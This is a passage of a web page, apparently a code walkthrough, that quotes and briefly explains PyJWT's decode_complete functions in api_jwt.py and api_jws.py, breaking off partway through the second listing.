<p>Seemingly, <a href="https://github.com/jpadilla/pyjwt/blob/master/jwt/api_jwt.py#L286"><code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">decode(...)</code></a> just calls <a href="https://github.com/jpadilla/pyjwt/blob/master/jwt/api_jwt.py#L163"><code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">decode_complete(...)</code></a>:</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M14.25.18l.9.2.73.26.59.3.45.32.34.34.25.34.16.33.1.3.04.26.02.2-.01.13V8.5l-.05.63-.13.55-.21.46-.26.38-.3.31-.33.25-.35.19-.35.14-.33.1-.3.07-.26.04-.21.02H8.77l-.69.05-.59.14-.5.22-.41.27-.33.32-.27.35-.2.36-.15.37-.1.35-.07.32-.04.27-.02.21v3.06H3.17l-.21-.03-.28-.07-.32-.12-.35-.18-.36-.26-.36-.36-.35-.46-.32-.59-.28-.73-.21-.88-.14-1.05-.05-1.23.06-1.22.16-1.04.24-.87.32-.71.36-.57.4-.44.42-.33.42-.24.4-.16.36-.1.32-.05.24-.01h.16l.06.01h8.16v-.83H6.18l-.01-2.75-.02-.37.05-.34.11-.31.17-.28.25-.26.31-.23.38-.2.44-.18.51-.15.58-.12.64-.1.71-.06.77-.04.84-.02 1.27.05zm-6.3 1.98l-.23.33-.08.41.08.41.23.34.33.22.41.09.41-.09.33-.22.23-.34.08-.41-.08-.41-.23-.33-.33-.22-.41-.09-.41.09zm13.09 3.95l.28.06.32.12.35.18.36.27.36.35.35.47.32.59.28.73.21.88.14 1.04.05 1.23-.06 1.23-.16 1.04-.24.86-.32.71-.36.57-.4.45-.42.33-.42.24-.4.16-.36.09-.32.05-.24.02-.16-.01h-8.22v.82h5.84l.01 2.76.02.36-.05.34-.11.31-.17.29-.25.25-.31.24-.38.2-.44.17-.51.15-.58.13-.64.09-.71.07-.77.04-.84.01-1.27-.04-1.07-.14-.9-.2-.73-.25-.59-.3-.45-.33-.34-.34-.25-.34-.16-.33-.1-.3-.04-.25-.02-.2.01-.13v-5.34l.05-.64.13-.54.21-.46.26-.38.3-.32.33-.24.35-.2.35-.14.33-.1.3-.06.26-.04.21-.02.13-.01h5.84l.69-.05.59-.14.5-.21.41-.28.33-.32.27-.35.2-.36.15-.36.1-.35.07-.32.04-.28.02-.21V6.07h2.09l.14.01zm-6.47 14.25l-.23.33-.08.41.08.41.23.33.33.23.41.08.41-.08.33-.23.23-.33.08-.41-.08-.41-.23-.33-.33-.23-.41-.08-.41.08z"></path></svg> <!-- -->py<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="">    </span><span class="token keyword">def</span><span class=""> </span><span class="token function">decode_complete</span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class="">        self</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class="">        jwt</span><span class="token punctuation">:</span><span class=""> </span><span class="token builtin">str</span><span class=""> </span><span class="token operator">|</span><span class=""> </span><span class="token builtin">bytes</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class="">        key</span><span class="token punctuation">:</span><span class=""> AllowedPublicKeyTypes </span><span class="token operator">=</span><span class=""> </span><span class="token string">&quot;&quot;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="">        algorithms</span><span class="token punctuation">:</span><span class=""> Sequence</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class=""> </span><span class="token operator">|</span><span class=""> </span><span class="token boolean">None</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="">        options</span><span class="token punctuation">:</span><span class=""> Options </span><span class="token operator">|</span><span class=""> </span><span class="token boolean">None</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class="">        </span><span class="token comment"># deprecated arg, remove in pyjwt3</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">8</span><span class="">        verify</span><span class="token punctuation">:</span><span class=""> </span><span class="token builtin">bool</span><span class=""> </span><span class="token operator">|</span><span class=""> </span><span class="token boolean">None</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class="">        </span><span class="token comment"># could be used as passthrough to api_jws, consider removal in pyjwt3</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class="">        detached_payload</span><span class="token punctuation">:</span><span class=""> </span><span class="token builtin">bytes</span><span class=""> </span><span class="token operator">|</span><span class=""> </span><span class="token boolean">None</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class="">        </span><span class="token comment"># passthrough arguments to _validate_claims</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class="">        </span><span class="token comment"># consider putting in options</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class="">        audience</span><span class="token punctuation">:</span><span class=""> </span><span class="token builtin">str</span><span class=""> </span><span class="token operator">|</span><span class=""> Iterable</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class=""> </span><span class="token operator">|</span><span class=""> </span><span class="token boolean">None</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class="">        issuer</span><span class="token punctuation">:</span><span class=""> </span><span class="token builtin">str</span><span class=""> </span><span class="token operator">|</span><span class=""> Container</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class=""> </span><span class="token operator">|</span><span class=""> </span><span class="token boolean">None</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class="">        subject</span><span class="token punctuation">:</span><span class=""> </span><span class="token builtin">str</span><span class=""> </span><span class="token operator">|</span><span class=""> </span><span class="token boolean">None</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">16</span><span class="">        leeway</span><span class="token punctuation">:</span><span class=""> </span><span class="token builtin">float</span><span class=""> </span><span class="token operator">|</span><span class=""> timedelta </span><span class="token operator">=</span><span class=""> </span><span class="token number">0</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">17</span><span class="">        </span><span class="token comment"># kwargs</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">18</span><span class="">        </span><span class="token operator">**</span><span class="">kwargs</span><span class="token punctuation">:</span><span class=""> Any</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">19</span><span class="">    </span><span class="token punctuation">)</span><span class=""> </span><span class="token operator">-</span><span class="token operator">&gt;</span><span class=""> </span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span><span class=""> Any</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">20</span><span class="">        </span><span class="token triple-quoted-string string">&quot;&quot;&quot;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">21</span>        ...
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">22</span><span class="token triple-quoted-string string">        &quot;&quot;&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">23</span><span class="">        </span><span class="token keyword">if</span><span class=""> kwargs</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">24</span><span class="">            warnings</span><span class="token punctuation">.</span><span class="">warn</span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">25</span><span class="">                </span><span class="token string">&quot;passing additional kwargs to decode_complete() is deprecated &quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">26</span><span class="">                </span><span class="token string">&quot;and will be removed in pyjwt version 3. &quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">27</span><span class="">                </span><span class="token string-interpolation string">f&quot;Unsupported kwargs: </span><span class="token string-interpolation interpolation punctuation">{</span><span class="token string-interpolation interpolation builtin">tuple</span><span class="token string-interpolation interpolation punctuation">(</span><span class="token string-interpolation interpolation">kwargs</span><span class="token string-interpolation interpolation punctuation">.</span><span class="token string-interpolation interpolation">keys</span><span class="token string-interpolation interpolation punctuation">(</span><span class="token string-interpolation interpolation punctuation">)</span><span class="token string-interpolation interpolation punctuation">)</span><span class="token string-interpolation interpolation punctuation">}</span><span class="token string-interpolation string">&quot;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">28</span><span class="">                RemovedInPyjwt3Warning</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">29</span><span class="">                stacklevel</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">30</span><span class="">            </span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">31</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">32</span><span class="">        </span><span class="token keyword">if</span><span class=""> options </span><span class="token keyword">is</span><span class=""> </span><span class="token boolean">None</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">33</span><span class="">            verify_signature </span><span class="token operator">=</span><span class=""> </span><span class="token boolean">True</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">34</span><span class="">        </span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">35</span><span class="">            verify_signature </span><span class="token operator">=</span><span class=""> options</span><span class="token punctuation">.</span><span class="">get</span><span class="token punctuation">(</span><span class="token string">&quot;verify_signature&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">36</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">37</span><span class="">        </span><span class="token comment"># If the user has set the legacy `verify` argument, and it doesn&#x27;t match</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">38</span><span class="">        </span><span class="token comment"># what the relevant `options` entry for the argument is, inform the user</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">39</span><span class="">        </span><span class="token comment"># that they&#x27;re likely making a mistake.</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">40</span><span class="">        </span><span class="token keyword">if</span><span class=""> verify </span><span class="token keyword">is</span><span class=""> </span><span class="token keyword">not</span><span class=""> </span><span class="token boolean">None</span><span class=""> </span><span class="token keyword">and</span><span class=""> verify </span><span class="token operator">!=</span><span class=""> verify_signature</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">41</span><span class="">            warnings</span><span class="token punctuation">.</span><span class="">warn</span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">42</span><span class="">                </span><span class="token string">&quot;The `verify` argument to `decode` does nothing in PyJWT 2.0 and newer. &quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">43</span><span class="">                </span><span class="token string">&quot;The equivalent is setting `verify_signature` to False in the `options` dictionary. &quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">44</span><span class="">                </span><span class="token string">&quot;This invocation has a mismatch between the kwarg and the option entry.&quot;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">45</span><span class="">                category</span><span class="token operator">=</span><span class="">DeprecationWarning</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">46</span><span class="">                stacklevel</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">47</span><span class="">            </span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">48</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">49</span><span class="">        sig_options</span><span class="token punctuation">:</span><span class=""> SigOptions </span><span class="token operator">=</span><span class=""> </span><span class="token punctuation">{</span><span class="token string">&quot;verify_signature&quot;</span><span class="token punctuation">:</span><span class=""> verify_signature</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">50</span><span class="">        decoded </span><span class="token operator">=</span><span class=""> api_jws</span><span class="token punctuation">.</span><span class="">decode_complete</span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">51</span><span class="">            jwt</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">52</span><span class="">            key</span><span class="token operator">=</span><span class="">key</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">53</span><span class="">            algorithms</span><span class="token operator">=</span><span class="">algorithms</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">54</span><span class="">            options</span><span class="token operator">=</span><span class="">sig_options</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">55</span><span class="">            detached_payload</span><span class="token operator">=</span><span class="">detached_payload</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">56</span><span class="">        </span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">57</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">58</span><span class="">        payload </span><span class="token operator">=</span><span class=""> self</span><span class="token punctuation">.</span><span class="">_decode_payload</span><span class="token punctuation">(</span><span class="">decoded</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">59</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">60</span><span class="">        merged_options </span><span class="token operator">=</span><span class=""> self</span><span class="token punctuation">.</span><span class="">_merge_options</span><span class="token punctuation">(</span><span class="">options</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">61</span><span class="">        self</span><span class="token punctuation">.</span><span class="">_validate_claims</span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">62</span><span class="">            payload</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">63</span><span class="">            merged_options</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">64</span><span class="">            audience</span><span class="token operator">=</span><span class="">audience</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">65</span><span class="">            issuer</span><span class="token operator">=</span><span class="">issuer</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">66</span><span class="">            leeway</span><span class="token operator">=</span><span class="">leeway</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">67</span><span class="">            subject</span><span class="token operator">=</span><span class="">subject</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">68</span><span class="">        </span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">69</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">70</span><span class="">        decoded</span><span class="token punctuation">[</span><span class="token string">&quot;payload&quot;</span><span class="token punctuation">]</span><span class=""> </span><span class="token operator">=</span><span class=""> payload
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">71</span><span class="">        </span><span class="token keyword">return</span><span class=""> decoded</span></code></pre></div></div>
<p>and in <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">decode_complete()</code>, the decoding of the JWT string is handled by <a href="https://github.com/jpadilla/pyjwt/blob/master/jwt/api_jws.py#L194"><code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">api_jws.decode_complete(...)</code></a></p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M14.25.18l.9.2.73.26.59.3.45.32.34.34.25.34.16.33.1.3.04.26.02.2-.01.13V8.5l-.05.63-.13.55-.21.46-.26.38-.3.31-.33.25-.35.19-.35.14-.33.1-.3.07-.26.04-.21.02H8.77l-.69.05-.59.14-.5.22-.41.27-.33.32-.27.35-.2.36-.15.37-.1.35-.07.32-.04.27-.02.21v3.06H3.17l-.21-.03-.28-.07-.32-.12-.35-.18-.36-.26-.36-.36-.35-.46-.32-.59-.28-.73-.21-.88-.14-1.05-.05-1.23.06-1.22.16-1.04.24-.87.32-.71.36-.57.4-.44.42-.33.42-.24.4-.16.36-.1.32-.05.24-.01h.16l.06.01h8.16v-.83H6.18l-.01-2.75-.02-.37.05-.34.11-.31.17-.28.25-.26.31-.23.38-.2.44-.18.51-.15.58-.12.64-.1.71-.06.77-.04.84-.02 1.27.05zm-6.3 1.98l-.23.33-.08.41.08.41.23.34.33.22.41.09.41-.09.33-.22.23-.34.08-.41-.08-.41-.23-.33-.33-.22-.41-.09-.41.09zm13.09 3.95l.28.06.32.12.35.18.36.27.36.35.35.47.32.59.28.73.21.88.14 1.04.05 1.23-.06 1.23-.16 1.04-.24.86-.32.71-.36.57-.4.45-.42.33-.42.24-.4.16-.36.09-.32.05-.24.02-.16-.01h-8.22v.82h5.84l.01 2.76.02.36-.05.34-.11.31-.17.29-.25.25-.31.24-.38.2-.44.17-.51.15-.58.13-.64.09-.71.07-.77.04-.84.01-1.27-.04-1.07-.14-.9-.2-.73-.25-.59-.3-.45-.33-.34-.34-.25-.34-.16-.33-.1-.3-.04-.25-.02-.2.01-.13v-5.34l.05-.64.13-.54.21-.46.26-.38.3-.32.33-.24.35-.2.35-.14.33-.1.3-.06.26-.04.21-.02.13-.01h5.84l.69-.05.59-.14.5-.21.41-.28.33-.32.27-.35.2-.36.15-.36.1-.35.07-.32.04-.28.02-.21V6.07h2.09l.14.01zm-6.47 14.25l-.23.33-.08.41.08.41.23.33.33.23.41.08.41-.08.33-.23.23-.33.08-.41-.08-.41-.23-.33-.33-.23-.41-.08-.41.08z"></path></svg> <!-- -->py<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="">    </span><span class="token keyword">def</span><span class=""> </span><span class="token function">decode_complete</span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class="">        self</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class="">        jwt</span><span class="token punctuation">:</span><span class=""> </span><span class="token builtin">str</span><span class=""> </span><span class="token operator">|</span><span class=""> </span><span class="token builtin">bytes</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class="">        key</span><span class="token punctuation">:</span><span class=""> AllowedPublicKeys </span><span class="token operator">|</span><span class=""> PyJWK </span><span class="token operator">|</span><span class=""> </span><span class="token builtin">str</span><span class=""> </span><span class="token operator">|</span><span class=""> </span><span class="token builtin">bytes</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token string">&quot;&quot;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="">        algorithms</span><span class="token punctuation">:</span><span class=""> Sequence</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class=""> </span><span class="token operator">|</span><span class=""> </span><span class="token boolean">None</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="">        options</span><span class="token punctuation">:</span><span class=""> SigOptions </span><span class="token operator">|</span><span class=""> </span><span class="token boolean">None</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class="">        detached_payload</span><span class="token punctuation">:</span><span class=""> </span><span class="token builtin">bytes</span><span class=""> </span><span class="token operator">|</span><span class=""> </span><span class="token boolean">None</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">8</span><span class="">        </span><span class="token operator">**</span><span class="">kwargs</span><span class="token punctuation">:</span><span class=""> </span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span><span class=""> Any</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class="">    </span><span class="token punctuation">)</span><span class=""> </span><span class="token operator">-</span><span class="token operator">&gt;</span><span class=""> </span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span><span class=""> Any</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class="">        </span><span class="token keyword">if</span><span class=""> kwargs</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class="">            warnings</span><span class="token punctuation">.</span><span class="">warn</span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class="">                </span><span class="token string">&quot;passing additional kwargs to decode_complete() is deprecated &quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class="">                </span><span class="token string">&quot;and will be removed in pyjwt version 3. &quot;</span><span class="">
